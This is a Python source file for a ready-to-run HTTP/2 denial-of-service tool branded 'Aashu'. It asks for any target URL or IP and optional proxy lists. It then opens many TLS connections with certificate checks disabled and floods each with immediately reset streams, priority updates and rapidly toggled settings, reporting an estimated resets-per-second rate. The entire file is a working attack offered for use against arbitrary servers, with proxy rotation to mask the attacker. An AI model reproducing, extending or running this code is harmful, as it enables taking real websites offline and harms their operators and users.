import asyncio,random,ssl,time,sys,re,socket
from concurrent.futures import ThreadPoolExecutor
import h2.config,h2.connection,h2.errors,h2.events
from cfonts import render
Aashu1=80;Aashu2=40;Aashu3=300000;Aashu4=150;Aashu5=0.005
def Aashu12(p,d=None):
 v=input(p).strip()
 return v if v else d
banner=render(' Aashu',font='block',colors=['red','white'],align='center',background='red')
print('\x1b[1;39m━'*63);print(banner);print('\x1b[1;39m━'*63)
import sys,time
print('\x1b[1;96m  Enter the target you want to test.\x1b[0m')
print('\x1b[1;93m  Examples:\x1b[0m')
print('\x1b[1;97m    • https://example.com\x1b[0m')
print('\x1b[1;97m    • 111.000.1.100\x1b[0m')
print();print('\x1b[1;96m  Target URL/IP:\x1b[0m')
Aashu6=input('\x1b[1;92m  └──> \x1b[0m').strip()
if not Aashu6:
 print('\n\x1b[1;91m  [!] ERROR: Target is required.\x1b[0m');sys.exit(1)
if re.match(r'^\d+\.\d+\.\d+\.\d+$',Aashu6):Aashu6=f'https://{Aashu6}'
if not Aashu6.startswith('https://'):Aashu6=f'https://{Aashu6}'
Aashu7=Aashu6.split('/')[2];Aashu8=443
Aashu14=input('\x1b[1;96m  Do you want to use proxies? (y/n): \x1b[0m').strip().lower()
if Aashu14.startswith('y'):
 Aashu9=input('\x1b[1;96m  Proxy file path (format: IP:PORT each line):\n\x1b[1;92m  └──> \x1b[0m').strip()
else:Aashu9=None
if Aashu9:print(f'\x1b[1;92m  [+] Proxy file: {Aashu9}\x1b[0m')
else:print('\x1b[1;93m  [!] No proxies – running without.\x1b[0m')
Aashu15=Aashu12(f'Threads [{Aashu1}]: ',str(Aashu1))
try:Aashu1=int(Aashu15)
except:pass
Aashu16=Aashu12(f'Connections per thread [{Aashu2}]: ',str(Aashu2))
try:Aashu2=int(Aashu16)
except:pass
Aashu17=Aashu12('Duration in seconds (0 = infinite): ','0')
try:Aashu18=int(Aashu17)
except:Aashu18=0
Aashu10=[];Aashu11=0
if Aashu9:
 try:
  with open(Aashu9,'r') as f:Aashu10=[l.strip() for l in f if l.strip() and len(l)>5]
  print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mLoaded:\x1b[0m \x1b[1;97m{len(Aashu10)} proxies\x1b[0m')
 except Exception as e:print(f'\x1b[1;91m[-]\x1b[0m \x1b[1;96mFailed to load proxies:\x1b[0m \x1b[1;97m{e}\x1b[0m');Aashu10=[]
def next_proxy():
 global Aashu11
 if not Aashu10:return None
 p=Aashu10[Aashu11%len(Aashu10)];Aashu11+=1;return p
class H2Conn:
 __slots__=('reader','writer','h2','task','dead','resets')
 def __init__(self,reader,writer):
  self.reader=reader;self.writer=writer
  cfg=h2.config.H2Configuration(client_side=True,header_encoding='utf-8')
  self.h2=h2.connection.H2Connection(config=cfg);self.h2.initiate_connection()
  writer.write(self.h2.data_to_send());self.task=asyncio.create_task(self._recv());self.dead=False;self.resets=0
 async def _recv(self):
  try:
   while not self.dead:
    d=await self.reader.read(65536)
    if not d:break
    evs=self.h2.receive_data(d)
    for e in evs:
     if isinstance(e,h2.events.RemoteSettingsChanged):self.h2.acknowledge_settings(e.changed_settings)
    self.writer.write(self.h2.data_to_send());await self.writer.drain()
  except:pass
  finally:self.dead=True
 async def flood(self,count):
  headers=[(':method','GET'),(':path','/'),(':scheme','https'),(':authority',Aashu7),('user-agent','Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'),('accept','*/*'),('cache-control','no-cache'),('range',f'bytes={random.randint(0,999999)}-{random.randint(0,999999)+4096}')]
  for _ in range(count):
   if self.dead:break
   sid=self.h2.get_next_available_stream_id()
   try:
    self.h2.send_headers(sid,headers,end_stream=True);self.h2.reset_stream(sid,error_code=h2.errors.ErrorCodes.CANCEL)
    self.writer.write(self.h2.data_to_send());await self.writer.drain();self.resets+=1
    for __ in range(Aashu4):
     if self.dead:break
     try:self.h2.update_priority(sid,weight=255,depends_on=0,exclusive=True);self.writer.write(self.h2.data_to_send());await self.writer.drain()
     except:break
   except:break
 async def storm(self,duration):
  start=time.monotonic();toggle=False
  while time.monotonic()-start<duration:
   if self.dead:break
   self.h2.update_settings({1:0 if toggle else 100});self.writer.write(self.h2.data_to_send());await self.writer.drain();await asyncio.sleep(Aashu5);toggle=not toggle
 async def close(self):
  self.dead=True
  if not self.writer.is_closing():self.writer.close();await self.writer.wait_closed()
  self.task.cancel()
  try:await self.task
  except:pass
async def connect_via_proxy(proxy):
 proxy_host,proxy_port=proxy.split(':');proxy_port=int(proxy_port)
 reader,writer=await asyncio.open_connection(proxy_host,proxy_port)
 connect_req=(f"CONNECT {Aashu7}:{Aashu8} HTTP/1.1\r\nHost: {Aashu7}:{Aashu8}\r\nUser-Agent: Mozilla/5.0\r\nProxy-Connection: Keep-Alive\r\n\r\n")
 writer.write(connect_req.encode());await writer.drain()
 while True:
  line=await reader.readline()
  if line==b'\r\n' or line==b'\n':break
  if not line:raise Exception("Proxy connection closed")
 return reader,writer
async def worker(tid):
 conns=[];tasks=[]
 print(f'\x1b[1;96m[WORKER {tid}]\x1b[0m \x1b[1;97mStarting...\x1b[0m')
 ssl_ctx=ssl.create_default_context();ssl_ctx.check_hostname=False;ssl_ctx.verify_mode=ssl.CERT_NONE;ssl_ctx.set_alpn_protocols(['h2'])
 for _ in range(Aashu2):
  try:
   proxy=next_proxy() if Aashu10 else None
   if proxy:
    reader,writer=await connect_via_proxy(proxy)
    writer=await asyncio.start_tls(reader,writer,ssl_ctx,server_hostname=Aashu7)
   else:reader,writer=await asyncio.open_connection(Aashu7,Aashu8,ssl=ssl_ctx)
   conn=H2Conn(reader,writer);conns.append(conn)
   flood_task=asyncio.create_task(conn.flood(Aashu3))
   storm_task=asyncio.create_task(conn.storm(Aashu18 if Aashu18>0 else 3600))
   tasks.extend([flood_task,storm_task])
  except Exception as e:print(f'\x1b[1;91m[WORKER {tid}]\x1b[0m \x1b[1;93mConnection error:\x1b[0m \x1b[1;97m{e}\x1b[0m');continue
 try:await asyncio.gather(*tasks)
 except:pass
 finally:
  for c in conns:await c.close()
 print(f'\x1b[1;92m[WORKER {tid}]\x1b[0m \x1b[1;97mFinished.\x1b[0m')
async def main():
 Aashu19=Aashu1*Aashu2
 print(f'\n\x1b[1;92m[+]\x1b[0m \x1b[1;96mTARGET:\x1b[0m \x1b[1;97m{Aashu6}\x1b[0m')
 print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mTHREADS:\x1b[0m \x1b[1;97m{Aashu1}\x1b[0m')
 print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mCONNECTIONS:\x1b[0m \x1b[1;97m{Aashu19}\x1b[0m')
 print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mPROXIES:\x1b[0m \x1b[1;97m{len(Aashu10)}\x1b[0m')
 print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mESTIMATED RATE:\x1b[0m \x1b[1;93m{Aashu19*8000} resets/second\x1b[0m')
 if Aashu18>0:print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mDURATION:\x1b[0m \x1b[1;97m{Aashu18} seconds\x1b[0m')
 else:print('\x1b[1;93m[!]\x1b[0m \x1b[1;97mRUNNING UNTIL CTRL+C\x1b[0m')
 print('\n\x1b[1;93m[!]\x1b[0m \x1b[1;97mPRESS CTRL+C TO STOP\x1b[0m')
 print('\x1b[1;39m━'*63)
 Aashu20=[asyncio.create_task(worker(i)) for i in range(Aashu1)]
 Aashu21=time.monotonic()
 try:
  while True:
   await asyncio.sleep(2)
   Aashu22=int(time.monotonic()-Aashu21)
   Aashu23=sum(1 for t in Aashu20 if not t.done())
   print(f'\x1b[1;90m[{Aashu22}s]\x1b[0m \x1b[1;96mACTIVE TASKS:\x1b[0m \x1b[1;97m{Aashu23}\x1b[0m')
   if Aashu23==0:break
   if Aashu18>0 and Aashu22>=Aashu18:break
 except KeyboardInterrupt:print('\n\x1b[1;93m[!]\x1b[0m \x1b[1;97mSTOPPING...\x1b[0m')
 finally:
  for t in Aashu20:t.cancel()
  await asyncio.gather(*Aashu20,return_exceptions=True)
  print('\x1b[1;92m[+]\x1b[0m \x1b[1;97mDONE\x1b[0m')
if __name__=='__main__':
 try:asyncio.run(main())
 except KeyboardInterrupt:print('\n\x1b[1;91m[!]\x1b[0m \x1b[1;97mEXIT\x1b[0m')
